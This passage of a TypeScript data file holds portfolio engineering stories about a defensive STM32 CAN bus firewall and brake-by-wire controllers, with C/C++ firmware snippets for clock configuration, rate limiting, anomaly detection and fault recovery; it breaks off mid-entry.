import { Story } from '@/types';

export const STORIES: Story[] = [
  // ==========================================
  // 1. CAN FIREWALL FORENSIC STORIES
  // ==========================================
  {
    id: 'can-clock-discrepancy',
    title: 'The 3.125× Clock Frequency Discrepancy & The Silent UART Baud Divisor Lockup',
    subtitle: 'How an uncorrected HSE_VALUE in STM32 HAL calculated a 562.5 MHz phantom clock, skewing delays and baud rates while hardware PLL ran true',
    category: 'Electronics & Embedded',
    categories: ['Electronics & Embedded', 'Cybersecurity & Systems'],
    date: 'Aug 2026',
    readTime: '2 min read',
    badge: 'Clock Tree Forensics',
    storyType: 'deep-dive',
    summary:
      'During initial bring-up of the inline CAN Firewall on STM32F446RE, the UART debug console returned corrupted character streams at 115,200 baud, and visual LED heartbeat pulses configured for 500 ms took 1.575 seconds. Yet, CAN bit timings (500 kbps) and hardware timer TIM5 microsecond timestamps were accurate. Forensic investigation revealed HSE_VALUE in stm32f4xx_hal_conf.h was left at the default 25 MHz instead of the physical 8 MHz crystal (a 3.125× discrepancy), causing software clock derivation to compute a phantom 562.5 MHz core clock.',
    theMistake:
      'I left the default ST header definition `#define HSE_VALUE 25000000UL` unchanged instead of setting it to the 8 MHz crystal soldered on the Nucleo-F446RE board.',
    theLesson:
      'Hardware peripherals configured with raw PLL register values run at physical clock speeds, while software HAL timing relies on header constants. Always verify `#define HSE_VALUE` matches the physical crystal on the PCB.',
    sections: [
      {
        heading: 'The 1.575-Second 500ms Blink',
        content:
          'When flashing the STM32F446RE firewall firmware, connecting to /dev/ttyACM0 at 115,200 baud returned framing errors and corrupted ASCII streams. Visual LED heartbeat pulses configured to blink every 500 ms via HAL_Delay(500) took approximately 1.575 seconds per cycle. Inexplicably, CAN bus bit timings (500 kbps) and hardware timer TIM5 microsecond timestamps were perfectly accurate.',
        type: 'mistake',
      },
      {
        heading: 'Physical PLL vs Derived Software Clock Registers',
        content:
          'The Nucleo-F446RE board uses an 8 MHz external crystal, but stm32f4xx_hal_conf.h defined HSE_VALUE as 25 MHz (a 25/8 = 3.125 ratio). The PLL configuration multipliers (PLLM=8, PLLN=360, PLLP=2) were passed directly as raw register masks into hardware RCC registers, so the physical core ran at 180 MHz. However, SystemCoreClockUpdate() used the 25 MHz constant to calculate a phantom frequency of 562.5 MHz (180 × 3.125). HAL_InitTick() configured SysTick with a reload value 3.125× too large (500ms × 3.125 = 1562.5 ms), and USART2 computed a baud divider for an assumed 135 MHz APB1 clock, transmitting at ~36,864 baud instead of 115,200.',
        callout:
          'The PLL ran true at 180 MHz in silicon, but software HAL calculations believed the core was running at 562.5 MHz.',
        type: 'breakthrough',
      },
      {
        heading: 'The Header Correction',
        content:
          'Correcting HSE_VALUE in stm32f4xx_hal_conf.h from 25000000U to 8000000U immediately evaluated SystemCoreClock to 180 MHz, normalized SysTick to 1,000 Hz, restored 500 ms heartbeat precision, and streamed crisp 115,200 baud telemetry without framing glitches.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'Baud Restored', value: '115,200 baud' },
      { label: 'Clock Error', value: '3.125x Skew' },
      { label: 'SysTick', value: '1,000 Hz Exact' },
    ],
    tags: ['STM32F446', 'Clock Tree', 'HSE_VALUE', 'SysTick', 'UART Baud', 'Embedded C'],
    relatedProjectId: 'can-firewall',
    snippet: {
      title: 'HSE_VALUE Crystal Definition Fix',
      language: 'c',
      code: `// Corrected in: Firewall_Firmware/Core/Inc/stm32f4xx_hal_conf.h
#if !defined  (HSE_VALUE) 
  #define HSE_VALUE    8000000U /*!< Value of the External oscillator in Hz (Nucleo 8MHz crystal) */
#endif`,
    },
  },
  {
    id: 'can-bidirectional-collision',
    title: 'The Bidirectional State Collision & Complete Reverse-Channel Starvation',
    subtitle: 'How sharing a single policy timestamp state across dual CAN controllers dropped 98.9% of legitimate reverse-channel frames',
    category: 'Cybersecurity & Systems',
    categories: ['Cybersecurity & Systems', 'Electronics & Embedded'],
    date: 'Aug 2026',
    readTime: '2 min read',
    badge: '1.1% → 100.0% Delivery',
    storyType: 'deep-dive',
    summary:
      'In our dual-bus CAN gateway between untrusted and protected buses, bidirectional diagnostic and control CAN IDs (e.g. 0x130) forwarded forward traffic at 94.0%, but dropped 98.9% of reverse frames (only 1.1% delivered). The statistical rate-limiter stored only one timestamp per policy ID, comparing reverse responses against recent forward frames and misclassifying them as DoS bursts.',
    theMistake:
      'I indexed the inter-arrival state table purely by policy entry index (`id_states[policy_idx]`), assuming message timing was independent of physical bus ingress port.',
    theLesson:
      'In multi-port gateway architectures, rate-limiting and statistical state must be strictly keyed per (Identifier, Ingress_Bus) tuple to prevent cross-channel temporal collisions.',
    sections: [
      {
        heading: 'The 98.9% Reverse Packet Drop',
        content:
          'When benchmarking full-duplex traffic across CAN1 (Untrusted) and CAN2 (Protected), forward traffic forwarded 14,855 / 15,810 frames (94.0%), while reverse traffic delivered only 162 / 15,030 frames (1.1% delivery). Diagnostic responses were starved completely.',
        type: 'mistake',
      },
      {
        heading: 'Single Shared Timestamp State',
        content:
          'In gate1_statistical.c, the state array id_states[] stored a single last_timestamp_us per policy index. When an ECU on CAN1 transmitted ID 0x130, timestamp T0 was recorded. When the protected ECU on CAN2 replied at T0 + 300 µs, gate1 evaluated dt = 300 µs against the 10,000 µs nominal inter-arrival threshold, flagging legitimate replies as DoS bursts and dropping them.',
        callout:
          'Forward frames and reverse replies shared the same timestamp variable, causing legitimate two-way dialogues to self-collide.',
        type: 'breakthrough',
      },
      {
        heading: 'Decoupled Per-Bus State Ingress',
        content:
          'Refactoring id_state_t to maintain last_timestamp_us[2] (indexed by source_bus 0 or 1) decoupled forward and reverse arrival baselines. Reverse-channel forwarding jumped from 1.1% to 100.0% (9,900 / 9,900 frames delivered) with zero dropouts.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'Reverse Delivery', value: '1.1% → 100.0%' },
      { label: 'Forward Delivery', value: '100.0%' },
      { label: 'Packet Drops', value: '0 Frames' },
    ],
    tags: ['CAN Bus', 'Dual bxCAN', 'Gateway Architecture', 'Race Condition', 'Embedded C'],
    relatedProjectId: 'can-firewall',
    snippet: {
      title: 'Decoupled Per-Bus Timestamp Structure',
      language: 'c',
      code: `// Fixed in: Firewall_Firmware/Core/Src/gate1_statistical.c
typedef struct {
    uint32_t last_timestamp_us[2]; // Index 0: CAN1 (Untrusted), Index 1: CAN2 (Protected)
} id_state_t;

uint8_t gate1_check_interarrival(uint8_t policy_idx, uint8_t bus_id, uint32_t now_us, uint32_t min_interval_us) {
    uint32_t dt = now_us - id_states[policy_idx].last_timestamp_us[bus_id];
    if (dt < min_interval_us) {
        return 0; // Drop burst on this specific ingress bus
    }
    id_states[policy_idx].last_timestamp_us[bus_id] = now_us;
    return 1; // Accept and advance bus-specific baseline
}`,
    },
  },
  {
    id: 'can-firewall-optimization',
    title: 'Why 4D Math Choked Our CPU (And Why Simpler is Better)',
    subtitle: 'Scrapping an Isolation Forest for a 2-Feature Mahalanobis Distance that executes in 56 cycles on Cortex-M4 FPU',
    category: 'Cybersecurity & Systems',
    categories: ['Cybersecurity & Systems', 'AI & Computer Vision', 'Electronics & Embedded'],
    date: 'Aug 2026',
    readTime: '2 min read',
    badge: '2,284 → 832 Cycles',
    storyType: 'deep-dive',
    summary:
      'When building our CAN bus intrusion firewall Gate 2, the initial 4-feature Isolation Forest burned 2,284 cycles (~12.7 µs) per frame. Feature ablation across 988,844 frames proved entropy was useless (moved AUC by <0.002) and timing had benign jitter tails. Scrapping the ensemble tree for a 2D Mahalanobis Distance (Payload L2 Delta + Burst Density) executed in 56 cycles on the Cortex-M4 FPU (832 cycles / 4.62 µs total Gate 2), boosting RPM spoofing AUC from 0.30 to 0.988.',
    theMistake:
      'I assumed an ensemble tree model with 4 features would be superior. I didn’t profile cycle cost or conduct feature ablation until burst traffic consumed over 6.3% of the real-time budget.',
    theLesson:
      'Measure feature contributions ruthlessly before deploying ML to microcontrollers. If a feature costs 30% of cycles but moves AUC by <0.002, eliminate it. Closed-form statistical metrics often outperform complex ensemble trees on edge hardware.',
    sections: [
      {
        heading: 'The 2,284-Cycle Bottleneck',
        content:
          'Automotive CAN buses have strict 200 µs frame deadlines at 500 kbps. When flashing the initial 4-feature Isolation Forest onto STM32F446RE, traversing decision trees consumed 2,284 CPU cycles (~12.7 µs). Calculating Shannon entropy alone burned 481 cycles per frame with floating-point logarithms.',
        type: 'mistake',
      },
      {
        heading: 'Feature Ablation on 988,844 Frames',
        content:
          'Offline ablation across HCRL intrusion datasets proved entropy moved AUC by <0.002. Without Burst Density, gear and RPM spoofing AUC collapsed to 0.21–0.30 because spoofed payloads look syntactically valid and are visible only as cumulative density. Payload Delta + Burst Density yielded 0.9888 AUC at 832 cycles.',
        callout:
          'Eliminating redundant entropy math reduced the matrix calculation to a 2D closed form executing in 56 cycles on the Cortex-M4 hardware FPU.',
        type: 'breakthrough',
      },
      {
        heading: '56-Cycle Hardware FPU Execution',
        content:
          'We replaced the tree model with a 2D Mahalanobis Distance classifier (Payload L2 Delta + Burst Density). Executed with ARM Cortex-M4 single-precision FPU operations and compiled with -O2, the evaluation completed in 56 cycles (0.31 µs), with full Gate 2 evaluation taking 832 cycles (4.62 µs) while retaining 99.9% RPM attack blocking.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'Gate 2 Cycles', value: '832 cycles' },
      { label: 'FPU Math Form', value: '56 cycles' },
      { label: 'RPM Spoof AUC', value: '0.9888' },
    ],
    tags: ['STM32F446', 'CMSIS-DSP', 'Mahalanobis Distance', 'ARM Cortex-M4', 'Feature Ablation'],
    relatedProjectId: 'can-firewall',
    snippet: {
      title: '56-Cycle Closed-Form Mahalanobis Distance on Cortex-M4 FPU',
      language: 'c',
      code: `// Excerpt from: CAN_Firewall/Firewall_Firmware/Core/Src/gate2_anomaly.c
float gate2_compute_mahalanobis_2d(float x0, float x1, const float inv_cov[2][2]) {
    // x0: Normalized Payload L2 Delta, x1: Normalized Burst Density
    float term0 = inv_cov[0][0] * x0 + inv_cov[0][1] * x1;
    float term1 = inv_cov[1][0] * x0 + inv_cov[1][1] * x1;
    return (x0 * term0) + (x1 * term1);
}`,
    },
  },
  {
    id: 'can-split-state-update',
    title: 'The Split State-Update Rule & The Adversarial Baseline Poisoning Flaw',
    subtitle: 'How updating payload baselines with rejected adversarial frames allowed subsequent attack frames to bypass Gate 2',
    category: 'Cybersecurity & Systems',
    categories: ['Cybersecurity & Systems', 'Electronics & Embedded'],
    date: 'Aug 2026',
    readTime: '2 min read',
    badge: '82.9% → 100.0% Block',
    storyType: 'reflection',
    summary:
      'During simulated RPM spoofing attacks, the firewall blocked the first fake frame, but passed all subsequent attack frames as legitimate (blocking dropped to 82.9%). The anomaly detector was updating its reference payload on every evaluated frame. By updating with the rejected payload, the next spoofed frame had zero payload delta from the new baseline. Withholding payload updates on rejected frames while advancing burst history boosted RPM spoofing blocking to 100.0% while keeping legitimate throughput at 97.4%.',
    theMistake:
      'I unconditionally updated the baseline reference payload with the incoming frame payload, even when the frame was classified as anomalous and dropped.',
    theLesson:
      'In stateful anomaly detectors, updating baseline state with rejected adversarial inputs allows one-step baseline poisoning. Always decouple semantic feature baselines (advance only on accepted frames) from physical channel counters (advance on all frames to avoid burst starvation).',
    sections: [
      {
        heading: 'The Second-Frame Bypass',
        content:
          'When testing with spoofed RPM frames (0x316 carrying 0xFF 0xFF), Gate 2 caught frame #1, but passed frame #2 and all subsequent frames through to the protected bus, dropping attack blocking to 82.9%.',
        type: 'mistake',
      },
      {
        heading: 'Adversarial Baseline Poisoning Discovery',
        content:
          'In gate2_anomaly.c, memcpy(stats->last_payload, current_payload, 8) was executed unconditionally on every evaluated frame. Frame #1 was rejected due to high delta from the legitimate payload, but updating last_payload poisoned the baseline with fake bytes. Frame #2 matched the poisoned baseline perfectly (|P_bad - P_bad| = 0), passing right through.',
        callout:
          'Withholding payload reference updates on rejected frames stopped poisoning, but withholding burst history starved density counters. We needed an asymmetric split update rule.',
        type: 'breakthrough',
      },
      {
        heading: 'The Split State-Update Rule',
        content:
          'On rejected frames: withhold the payload reference (preserving true baseline) while advancing burst history (tracking physical wire density). On accepted frames: advance both. RPM spoofing block rate rose to 100.0% and Gear spoofing reached 99.0%, with legitimate throughput holding at 97.4%.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'RPM Block Rate', value: '100.0%' },
      { label: 'Gear Block Rate', value: '99.0%' },
      { label: 'Legit Delivery', value: '97.4%' },
    ],
    tags: ['Stateful Anomaly Detection', 'Baseline Poisoning', 'CAN Security', 'Defensive Systems', 'Embedded C'],
    relatedProjectId: 'can-firewall',
  },
  {
    id: 'can-masquerade-standdown',
    title: 'The Masquerade Bimodal Dilemma & The Rate-Tier Stand-Down Engine',
    subtitle: 'Resolving the 71.6 percentage-point coin-flip spread when two ECUs transmit the same CAN ID at nominal cadence',
    category: 'Cybersecurity & Systems',
    categories: ['Cybersecurity & Systems', 'Electronics & Embedded'],
    date: 'Aug 2026',
    readTime: '2 min read',
    badge: '99.9% Legit Delivery',
    storyType: 'deep-dive',
    summary:
      'When evaluating Gate 1 against masquerade attacks (where a rogue node transmits a legitimate CAN ID offset by half a phase), delivery of legitimate traffic swung randomly between 28.4% and 100.0% (a 71.6 pp spread). Without cryptographic identity in standard CAN frames, deterministic filtering randomly dropped legitimate frames half the time. We solved this with a Rate-Tier Stand-Down engine: on 2x nominal masquerade traffic, the firewall stands down from dropping to preserve 99.9% legitimate command delivery while firing an authenticated Rate Alarm.',
    theMistake:
      'I attempted to deterministically drop duplicate CAN frames on a protocol that lacks transmitter authentication, resulting in a self-inflicted denial-of-service against the vehicle.',
    theLesson:
      'When attribution is mathematically impossible, deterministic dropping degrades into self-inflicted DoS. Safety-critical gateways must detect and alarm where attribution cannot be proven, standing down to preserve vehicle control while raising high-priority diagnostics.',
    sections: [
      {
        heading: 'The 71.6 Percentage-Point Spread',
        content:
          'When testing Gate 1 against masquerade attacks across repeated runs, delivery of legitimate traffic swung between 28.4% and 100.0%. Whichever transmitter won bus arbitration on frame #1 captured the timing slot, causing the firewall to drop 100% of the other node\'s frames.',
        type: 'mistake',
      },
      {
        heading: 'Protocol Identity Blindness',
        content:
          'Standard CAN 2.0B frames carry zero transmitter address or digital signatures. When two nodes transmit the same CAN ID at nominal 10 ms periods, neither timing nor payload can determine which frame came from the genuine ECU. Dropping half of genuine throttle commands caused the vehicle to enter limp mode.',
        callout:
          'Deterministic dropping without transmitter identity turns the firewall into a 50% coin-flip against legitimate ECUs.',
        type: 'breakthrough',
      },
      {
        heading: 'Rate-Tier Stand-Down Engine',
        content:
          'We established two rate tiers: Tier 1 (~2.0× nominal rate duplicate collision) stands down from dropping, guaranteeing 99.9% legitimate command delivery with 0.0 pp spread while firing an authenticated diagnostic Rate Alarm. Tier 2 (≥3.0× nominal rate floods) enforces full rejection (99.0%–99.9% block rate).',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'Legit Delivery', value: '99.9%' },
      { label: 'Variance Spread', value: '0.0 pp' },
      { label: 'Alarm Fired', value: 'Target 0x130' },
    ],
    tags: ['CAN 2.0B', 'Masquerade Attack', 'Rate Estimation', 'Defensive Engineering', 'Automotive Safety'],
    relatedProjectId: 'can-firewall',
  },
  {
    id: 'can-bxcan-mailbox-wedging',
    title: 'The bxCAN Transmit Mailbox Wedging & Auto-Retransmission Trap',
    subtitle: 'How a momentarily disconnected bus caused permanent bridge deadlock due to unacknowledged frame retransmissions',
    category: 'Electronics & Embedded',
    categories: ['Electronics & Embedded', 'Cybersecurity & Systems'],
    date: 'Aug 2026',
    readTime: '2 min read',
    badge: 'Mailbox Abort Watchdog',
    storyType: 'reflection',
    summary:
      'During bench testing, momentarily disconnecting the protected bus DB9 connector permanently locked the firewall. The 3 hardware transmit mailboxes filled with unacknowledged frames because AutoRetransmission was enabled, returning HAL_CAN_STATE_ERROR on all subsequent frames. The bridge never recovered even after reconnecting the cable. We resolved this by implementing a 2ms mailbox abort watchdog that calls HAL_CAN_AbortTxRequest() on the oldest mailbox when all 3 remain full.',
    theMistake:
      'I relied on default bxCAN auto-retransmission settings without implementing a hardware transmit mailbox timeout watchdog.',
    theLesson:
      'In store-and-forward gateways, hardware retransmission buffers become a deadlock vector when downstream links open. Always implement software abort watchdogs to flush stale transmit mailboxes and prevent bridging pipeline lockups.',
    sections: [
      {
        heading: 'Permanent Bridge Freeze on Cable Disconnect',
        content:
          'When a DB9 connector was unplugged momentarily, tx-mailboxes-free dropped from 3 to 0 and stayed pinned at 0 indefinitely. Even after reconnecting the cable, the firewall refused to forward any CAN messages until physical power was cycled.',
        type: 'mistake',
      },
      {
        heading: 'Unacknowledged Frame Retry Loops',
        content:
          'In STM32 bxCAN, AutoRetransmission = ENABLE causes the controller to retry unacknowledged frames indefinitely. When the bus is open-circuit, no ACK bit is received. Once all 3 hardware mailboxes fill with unacknowledged frames, all HAL_CAN_AddTxMessage() calls fail with HAL_CAN_STATE_ERROR.',
        type: 'breakthrough',
      },
      {
        heading: '2ms Mailbox Abort Watchdog',
        content:
          'We added a mailbox abort watchdog: if all 3 mailboxes remain full for >2 ms, firmware executes HAL_CAN_AbortTxRequest() on the oldest mailbox, freeing capacity for incoming real-time traffic and resetting Transmit Error Counters automatically.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'Mailbox Timeout', value: '2.0 ms' },
      { label: 'Deadlock Recovery', value: '100% Auto' },
      { label: 'TEC Monitoring', value: 'Active' },
    ],
    tags: ['STM32 bxCAN', 'Transmit Mailbox', 'HAL_CAN_Abort', 'Fault Recovery', 'Automotive CAN'],
    relatedProjectId: 'can-firewall',
  },

  // ==========================================
  // 2. ABHYUDAY DBW FORENSIC STORIES (2025 & 2026)
  // ==========================================
  {
    id: 'abaja-2025-stm32-to-arduino',
    title: 'The Last-Moment Plan Change: Emergency Fallback from STM32 HAL to Arduino Uno',
    subtitle: 'Rescuing brake-by-wire bring-up within 48 hours when 3.3V logic margins and HAL_CAN nested interrupts caused paddock freezes',
    category: 'Electronics & Embedded',
    categories: ['Electronics & Embedded'],
    date: 'Jan – Feb 2025',
    readTime: '2 min read',
    badge: '48-Hour Fallback · 2025',
    storyType: 'war-story',
    summary:
      'Days before track testing in the 2025 season, the centralized STM32F446RE Brake-By-Wire ECU suffered intermittent hard-faults and silent freezes during CAN bursts while polling 10 ADC samples in the main loop. Additionally, 3.3V GPIO levels struggled to reliably drive 5V optocoupled BTS7960 gate inputs under cold paddock conditions. In an emergency 48-hour sprint, we ported the logic to rugged 5V Arduino Uno microcontrollers with MCP2515 SPI CAN controllers, establishing a deterministic 200ms non-blocking polling loop and solid 5V gate drive.',
    theMistake:
      'We deployed complex, uncharacterized 3.3V STM32 HAL firmware with blocking ADC conversions and nested CAN RX FIFO interrupts right before testing, while underestimating 3.3V logic switching margins on 5V optoisolators.',
    theLesson:
      'Never deploy complex multi-peripheral HAL firmware to safety-critical actuators without bench flood testing. When paddock reliability is on the line, a rugged 5V microcontroller with dedicated SPI CAN offload beats an uncharacterized HAL state machine.',
    sections: [
      {
        heading: 'STM32 Hard-Faults and 3.3V Optocoupler Weakness',
        content:
          'The STM32F446RE was configured with HAL CAN notifications on FIFO 0. When high-frequency CAN traffic arrived while HAL_ADC_PollForConversion blocked execution in the main loop, nested interrupt latency cascaded, causing CPU hard-faults. Concurrently, 3.3V GPIO outputs struggled to trigger 5V optoisolators on BTS7960 H-bridges in cold paddock weather.',
        type: 'mistake',
      },
      {
        heading: '48-Hour Arduino Uno + MCP2515 Architecture Pivot',
        content:
          'We ported the firmware to dedicated 5V ATmega328P Arduino Uno boards paired with external MCP2515 SPI CAN controllers. 5V TTL logic provided solid gate drive to BTS7960 optocouplers without level-shifter jitter, and CAN polling was decoupled into a deterministic 200ms non-blocking window.',
        callout:
          'Under extreme paddock pressure, simplifying to a rugged 5V platform with SPI offload restored 0 to 40 bar hydraulic actuation within 48 hours.',
        type: 'breakthrough',
      },
      {
        heading: 'Deterministic Actuation Window',
        content:
          'Bench-testing confirmed non-blocking execution, rock-solid BTS7960 switching, and reliable CAN packet filtering, rescuing vehicle bring-up and laying the foundation for our subsequent 1st Place finishes in Phase 3.',
        type: 'lesson',
      },
    ],
    photo: {
      caption: 'Paddock workbench: Oscilloscope and prototyping the emergency 5V Arduino + MCP2515 CAN brake controller.',
      location: 'Team Testing Workshop',
      timestamp: '02:45 AM',
    },
    metrics: [
      { label: 'Rescue Window', value: '48 hrs' },
      { label: 'Control Loop', value: '200 ms' },
      { label: 'Pressure Range', value: '0–40 bar' },
    ],
    tags: ['Arduino Uno', 'STM32 HAL', 'MCP2515', 'BTS7960', 'Brake-by-Wire', 'Paddock Sprint'],
    relatedProjectId: 'abhyuday-dbw',
    snippet: {
      title: 'Emergency 5V Non-Blocking CAN Actuation Loop',
      language: 'cpp',
      code: `// Excerpt from: LastMomentPlanChange/BBW_arduino_can.cpp
const int EN_PIN = 7;   // Rugged 5V gate drive
const int RPWM_PIN = 6;
const int LPWM_PIN = 5;

void loop() {
  if (CAN_MSGAVAIL == CAN.checkReceive()) {
    CAN.readMsgBuf(&rxId, &len, rxBuf);
    if (rxId == 0x201 && len >= 1) {
      uint8_t brakePercent = constrain(rxBuf[0], 0, 100);
      targetPressureBar = brakePercent * (maxBrakePressure / 100.0f);
      brCommandTime = millis();
    }
  }
  // Deterministic 200ms non-blocking actuation window
  if (millis() - lastControlTime >= controlInterval) {
    lastControlTime = millis();
    float error = targetPressureBar - readFilteredPressureBar();
    if (abs(error) > pressureTolerance && (millis() - brCommandTime <= brakeAdjustmentWindow)) {
      digitalWrite(RPWM_PIN, error > 0 ? HIGH : LOW);
    } else {
      stopActuator();
    }
  }
}`,
    },
  },
  {
    id: 'abaja-twai-bus-off-reset',
    title: 'The Ghost in the Transceiver: Resolving ESP32 TWAI Bus-Off Lockup via Non-Volatile Boot Resets',
    subtitle: 'How an intentional 1-second cold-boot stabilization restart and runtime recovery state machine eliminated cold power switch lockups',
    category: 'Electronics & Embedded',
    categories: ['Electronics & Embedded'],
    date: 'Feb – Mar 2025',
    readTime: '2 min read',
    badge: '100% Boot Recovery',
    storyType: 'deep-dive',
    summary:
      'When powering the vehicle via the low-voltage master disconnect switch, the ESP32 booted in <15ms—faster than the 12V-to-3.3V buck converters stabilized. Inductive noise and undefined peer node states caused the TWAI peripheral to detect dominant glitches, accumulate transmit errors (TEC > 255), and latch into TWAI_STATE_BUS_OFF. Pressing the manual RST button worked because power was already stable. We fixed this with NVS bootCount tracking to execute a deliberate 1-second stabilization restart on cold boot, paired with a runtime bus-off recovery watchdog.',
    theMistake:
      'I assumed hardware power rails and CAN transceivers stabilized instantaneously upon battery contactor closure.',
    theLesson:
      'Automotive power rails are dirty and slow to settle. Microcontrollers boot faster than physical supplies stabilize. Power-up firmware must wait for rail stabilization or employ non-volatile reboot discrimination and runtime bus-off recovery state machines.',
    sections: [
      {
        heading: 'The Cold Boot Silent Failure',
        content:
          'When powering up the car via the main low-voltage battery disconnect switch, the ESP32 TWAI peripheral initialized in an unresponsive state or immediately entered TWAI_STATE_BUS_OFF, failing to transmit heartbeats. Yet, pressing the manual RST button on the development board worked perfectly every time.',
        type: 'mistake',
      },
      {
        heading: 'Buck Slew Rates and Transceiver Error Counters',
        content:
          '12V-to-3.3V buck converters took ~10–50 ms to stabilize, and contactor closing induced transients on CAN differential lines. The ESP32 booted in <15ms and immediately called twai_start(). Missing ACKs and bus glitches pushed Transmit Error Counters past 255, latching the hardware into Bus-Off.',
        callout:
          'The microcontrollers booted faster than the physical power rails and transceiver ICs could electrically reach equilibrium.',
        type: 'breakthrough',
      },
      {
        heading: 'NVS Cold-Boot Self-Restart & Runtime Watchdog',
        content:
          'Using Preferences.h, the ECU increments bootCount. On a genuine cold boot (bootCount == 1), the firmware waits 1000 ms for rails to stabilize and deliberately calls esp_restart(). Additionally, every 2000 ms, twai_get_status_info() checks for TWAI_STATE_BUS_OFF, executing twai_stop(), twai_driver_uninstall(), and setupTWAI() to automatically recover.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'Cold Boot Recovery', value: '100%' },
      { label: 'Bus-Off Unwedge', value: '<2000 ms' },
      { label: 'Manual Re-flashes', value: 'Zero' },
    ],
    tags: ['ESP32', 'TWAI Driver', 'SN65HVD230', 'NVS Preferences', 'Cold Boot Reset', 'Automotive CAN'],
    relatedProjectId: 'abhyuday-dbw',
    snippet: {
      title: 'NVS Boot Reset & Auto-Recovery Watchdog',
      language: 'cpp',
      code: `// Excerpt from: TBW/ESP32/TBWCAN_BootReset.cpp
void checkCANRecovery() {
  twai_status_info_t status;
  if (twai_get_status_info(&status) == ESP_OK && status.state == TWAI_STATE_BUS_OFF) {
    twai_stop();
    twai_driver_uninstall();
    delay(100);
    setupTWAI();
  }
}

void setup() {
  prefs.begin("bootData", false);
  int bootCount = prefs.getInt("bootCount", 0) + 1;
  prefs.putInt("bootCount", bootCount);
  prefs.end();

  if (bootCount == 1) {
    delay(1000); // 1s power rail stabilization delay
    esp_restart();
  }
  prefs.begin("bootData", false);
  prefs.putInt("bootCount", 0);
  prefs.end();
  setupTWAI();
}`,
    },
  },
  {
    id: 'abaja-pressure-stall-watchdog',
    title: 'Hydraulic Non-Linearity & Stall Detection: Pressure-Mapped Brake-by-Wire Control',
    subtitle: 'Preventing H-bridge MOSFET burnout with a 1500ms current-variance stall watchdog and PR12 pressure transfer function',
    category: 'Electronics & Embedded',
    categories: ['Electronics & Embedded'],
    date: 'Mar – Apr 2025',
    readTime: '2 min read',
    badge: '38.0 Bar Clamping',
    storyType: 'deep-dive',
    summary:
      'The 2025 Brake-by-Wire system drove a DC motor into a hydraulic master cylinder up to 38.0 bar. When incompressible fluid resistance was reached, the motor stalled against mechanical stops, drawing over 25A and overheating the BTS7960 MOSFETs. We implemented an active current-variance stall watchdog: if current delta was <0.05A for 1500ms while RPWM was active, power was immediately cut. We also formulated exact PR12 pressure sensor transfer functions and asymmetric 1.37s full retraction pulses.',
    theMistake:
      'Driving a linear actuator against a hydraulic column without closed-loop current sensing or stall timeout watchdogs.',
    theLesson:
      'Fluid columns become abruptly incompressible. When actuator travel hits hydraulic limits, motor back-EMF drops to zero and stall current destroys power stages in seconds unless firmware actively tracks current variance and enforces hardware cutoffs.',
    sections: [
      {
        heading: 'Hydraulic Stalls & Overheating MOSFETs',
        content:
          'When full braking (100%) was commanded, the actuator drove against the mechanical stop of the master cylinder once brake fluid reached incompressibility. Motor current surged past 25A, heating the BTS7960 H-bridge heatsinks to dangerous thresholds within seconds.',
        type: 'mistake',
      },
      {
        heading: 'Current-Variance Stall Detection',
        content:
          'When an electric motor stalls against an incompressible hydraulic column, back-EMF drops to zero and current flatlines at stall current with minimal brush noise. We tracked current derivative: if |currentAmps - lastCurrent| < 0.05A for 1500 ms while driving forward, the ECU forcibly set RPWM = LOW.',
        callout:
          'Tracking current variance (<0.05A delta) reliably detected hydraulic end-of-travel before power stages overheated.',
        type: 'breakthrough',
      },
      {
        heading: 'PR12 Transfer Math and Asymmetric Retraction',
        content:
          'We calibrated the ratiometric 5V PR12 transducer transfer function (PSI = ((V_sensor / V_supply) - 0.1) / 0.00032) and added dedicated 1.37s LPWM = 254 retraction pulses on 0% brake commands to guarantee master cylinders fully disengaged.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'Peak Pressure', value: '38.0 bar' },
      { label: 'Stall Timeout', value: '1500 ms' },
      { label: 'Current Delta', value: '<0.05 A' },
    ],
    tags: ['Brake-by-Wire', 'BTS7960', 'ACS712', 'PR12 Transducer', 'Stall Detection', 'Hydraulics'],
    relatedProjectId: 'abhyuday-dbw',
    snippet: {
      title: 'Current-Variance Stall Watchdog',
      language: 'cpp',
      code: `// Excerpt from: BBW/pressuremappedbrakes.cpp
const float currentStallThreshold = 0.05; // 50 mA current delta threshold
const unsigned long stallTimeout = 1500;   // 1.5s stall timeout

if (digitalRead(RPWM_PIN) == HIGH) {
  if (abs(currentAmps - lastCurrent) < currentStallThreshold) {
    if (stableStartTime == 0) {
      stableStartTime = millis();
    } else if (millis() - stableStartTime >= stallTimeout) {
      digitalWrite(RPWM_PIN, LOW); // Hard power cut on hydraulic stall
      brActive = false;
      Serial.println("!!! STALL DETECTED: RPWM FORCED OFF !!!");
    }
  } else {
    stableStartTime = 0;
    lastCurrent = currentAmps;
  }
}`,
    },
  },
  {
    id: 'abaja-isolated-motor-node',
    title: 'The 5kW Motor Controller Ground Loop & The Isolated Motor Node Architecture',
    subtitle: 'Solving 72V inverter ground bounce and low-current Hall trigger failures with B1205S DC-DC and ISO7721 CAN isolation',
    category: 'Electronics & Embedded',
    categories: ['Electronics & Embedded'],
    date: 'May 2026',
    readTime: '2 min read',
    badge: '1.5kV Galvanic Isolation',
    storyType: 'deep-dive',
    summary:
      'Interfacing low-voltage ECUs with a Datai 5kW BLDC motor controller presented two major issues: the motor Hall wire had a weak >4.7kΩ pull-up (<1mA source) unable to trigger an optocoupler LED, and connecting shared grounds injected 72V PWM switching noise, blowing USB ports and causing ESP32 brownouts. We created the Isolated Motor Node: placed an ESP32-C3 in the high-voltage ground domain powered via a B1205S-3W 1.5kV isolated DC-DC converter, amplified the Hall signal with a 2N2222A NPN BJT, and crossed the isolation boundary exclusively with an ISO7721 digital CAN isolator.',
    theMistake:
      'Trying to isolate individual noisy analog throttle and sensor wires spanning the physical chassis rather than isolating the compute node at the digital communication boundary.',
    theLesson:
      'When interfacing with high-power traction inverters, do not attempt to isolate multiple dirty analog and PWM lines individually. Move the processing node into the high-voltage ground domain and cross the isolation barrier exclusively with a differential digital bus (CAN).',
    sections: [
      {
        heading: '72V Inverter Ground Bounce & Blown USB Ports',
        content:
